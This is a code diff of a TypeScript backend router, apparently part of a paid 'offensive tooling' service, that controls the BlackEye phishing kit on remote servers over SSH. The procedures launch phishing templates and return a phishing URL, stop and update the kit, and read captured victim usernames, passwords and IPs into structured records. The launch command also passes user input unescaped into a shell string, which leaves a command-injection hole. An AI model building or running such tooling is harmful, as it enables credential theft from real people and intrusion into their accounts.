-      const launchCmd = `cd /opt/blackeye && nohup bash -c "echo '${templateNum}' | bash blackeye.sh" > /tmp/blackeye_${input.port}.log 2>&1 &`;
-      await execSSHCommand(sshConfig, launchCmd, 10000, ctx.user.id);
-      await new Promise(r => setTimeout(r, 2000));
-      // Get the server's public IP for the phishing URL
-      const ipOutput = await execSSHCommand(sshConfig, "curl -s ifconfig.me 2>/dev/null || hostname -I | awk '{print $1}'", 5000, ctx.user.id);
-      const serverIp = ipOutput.trim().split("\n")[0] || sshConfig.host;
-      const phishingUrl = input.customDomain
-        ? `http://${input.customDomain}`
-        : `http://${serverIp}`;
-      await consumeCredits(ctx.user.id, "blackeye_action", `BlackEye launch: ${input.template}`);
+      const node = await getActiveNode(ctx.user.id);
+      if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active node." });
+      const cmd = `cd /opt/blackeye && nohup bash blackeye.sh ${input.template ?? ''} > /tmp/blackeye.log 2>&1 & sleep 1; echo LAUNCHED`;
+      const out = await execSSHCommand(nodeToSSH(node), cmd, 15000, ctx.user.id);
+      const host = input.customDomain || node.publicIp || node.sshHost;
+      const phishingUrl = `http://${host}:${input.port ?? 80}`;
       return {
-        success: true,
+        success: out.includes("LAUNCHED"),
+        message: `BlackEye launched on ${host}`,
+        url: phishingUrl,
+        // backward-compat fields BlackEyePage uses for setActiveSession
         phishingUrl,
-        serverIp,
-        template: input.template,
-        logFile: `/tmp/blackeye_${input.port}.log`,
+        template: input.template ?? '',
+        logFile: '/tmp/blackeye.log',
       };
     }),
 
-  /**
-   * Stop all running BlackEye instances
-   */
   stop: protectedProcedure.mutation(async ({ ctx }) => {
     const plan = await getUserPlan(ctx.user.id);
     enforceFeature(plan.planId, "offensive_tooling", "BlackEye");
-    const sshConfig = await getSshConfig(ctx.user.id);
-    const output = await execSSHCommand(
-      sshConfig, "pkill -f blackeye.sh 2>/dev/null; fuser -k 80/tcp 2>/dev/null; fuser -k 8080/tcp 2>/dev/null; echo 'Stopped'", 10000
-    , ctx.user.id);
-    return { success: true, output };
+    const node = await getActiveNode(ctx.user.id);
+    if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active node." });
+    await execSSHCommand(nodeToSSH(node), "pkill -f blackeye 2>/dev/null; echo STOPPED", 10000, ctx.user.id);
+    return { success: true, message: "BlackEye stopped." };
   }),
 
-  /**
-   * Read captured credentials from the log file
-   */
-  getCaptured: protectedProcedure
-    .input(z.object({ logFile: z.string().optional() }))
-    .mutation(async ({ ctx, input }) => {
-      const plan = await getUserPlan(ctx.user.id);
-      enforceFeature(plan.planId, "offensive_tooling", "BlackEye");
-      const sshConfig = await getSshConfig(ctx.user.id);
-      const logPath = input.logFile || "/opt/blackeye/sites/*/usernames.txt";
-      const output = await execSSHCommand(
-        sshConfig, `cat ${logPath} 2>/dev/null || echo 'No captures yet'`, 10000
-      , ctx.user.id);
-      // Parse captures: each line is typically "username:password" or "email:password"
-      const captures = output
-        .split("\n")
-        .filter(line => line.includes(":") && !line.startsWith("#"))
-        .map((line, idx) => {
-          const [username, ...rest] = line.split(":");
-          return {
-            id: idx + 1,
-            username: username?.trim() || "",
-            password: rest.join(":").trim(),
-            capturedAt: new Date().toISOString(),
-          };
-        });
-      return { captures, raw: output };
-    }),
+  getCaptured: protectedProcedure.mutation(async ({ ctx }) => {
+    const plan = await getUserPlan(ctx.user.id);
+    enforceFeature(plan.planId, "offensive_tooling", "BlackEye");
+    const node = await getActiveNode(ctx.user.id);
+    if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active node." });
+    const out = await execSSHCommand(nodeToSSH(node), "cat /opt/blackeye/captured.txt 2>/dev/null || echo ''", 10000, ctx.user.id);
+    const captures = out.split('\n').map(l => l.trim()).filter(Boolean).map((line, idx) => {
+      const parts = line.split(':');
+      return { id: String(idx), username: parts[0] ?? line, password: parts[1] ?? '', ip: parts[2] ?? '', timestamp: parts[3] ?? new Date().toISOString(), capturedAt: parts[3] ?? new Date().toISOString() };
+    });
+    return { data: out, captures };
+  }),
 
-  /**
-   * Get the live log output from a running BlackEye session
-   */
   getLogs: protectedProcedure
-    .input(z.object({ lines: z.number().default(50) }))
+    .input(z.object({ lines: z.number().optional() }).optional())
     .mutation(async ({ ctx, input }) => {
-      const plan = await getUserPlan(ctx.user.id);
-      enforceFeature(plan.planId, "offensive_tooling", "BlackEye");
-      const sshConfig = await getSshConfig(ctx.user.id);
-      const output = await execSSHCommand(
-        sshConfig, `tail -${input.lines} /tmp/blackeye_80.log 2>/dev/null || echo 'No active session log found'`, 10000
-      , ctx.user.id);
-      return { output };
-    }),
+    const plan = await getUserPlan(ctx.user.id);
+    enforceFeature(plan.planId, "offensive_tooling", "BlackEye");
+    const node = await getActiveNode(ctx.user.id);
+    if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active node." });
+    const n = input?.lines ?? 100;
+    const out = await execSSHCommand(nodeToSSH(node), `tail -${n} /tmp/blackeye.log 2>/dev/null || echo 'No logs yet'`, 10000, ctx.user.id);
+    return { logs: out, output: out };
+  }),
 
-  /**
-   * Update BlackEye to the latest version
-   */
   update: protectedProcedure.mutation(async ({ ctx }) => {
     const plan = await getUserPlan(ctx.user.id);
     enforceFeature(plan.planId, "offensive_tooling", "BlackEye");
-    const sshConfig = await getSshConfig(ctx.user.id);
-    const output = await execSSHCommand(
-      sshConfig, "cd /opt/blackeye && git pull origin master 2>&1 && echo 'Updated successfully'", 30000
-    , ctx.user.id);
-    return { success: true, output };
+    const node = await getActiveNode(ctx.user.id);
+    if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active node." });
+    const out = await execSSHCommand(nodeToSSH(node), "cd /opt/blackeye && git pull 2>&1 | tail -3", 30000, ctx.user.id);
+    return { success: true, message: out || "Update complete.", output: out || "Update complete." };
   }),
-
-  /**
-   * Run a raw SSH command on the BlackEye server (admin use)
-   */
-  runCommand: protectedProcedure
-    .input(z.object({ command: z.string().min(1).max(500) }))
-    .mutation(async ({ ctx, input }) => {
-      const plan = await getUserPlan(ctx.user.id);
-      enforceFeature(plan.planId, "offensive_tooling", "BlackEye");
-      const sshConfig = await getSshConfig(ctx.user.id);
-      const output = await execSSHCommand(sshConfig, input.command, 15000, ctx.user.id);
-      return { output };
-    }),
 });
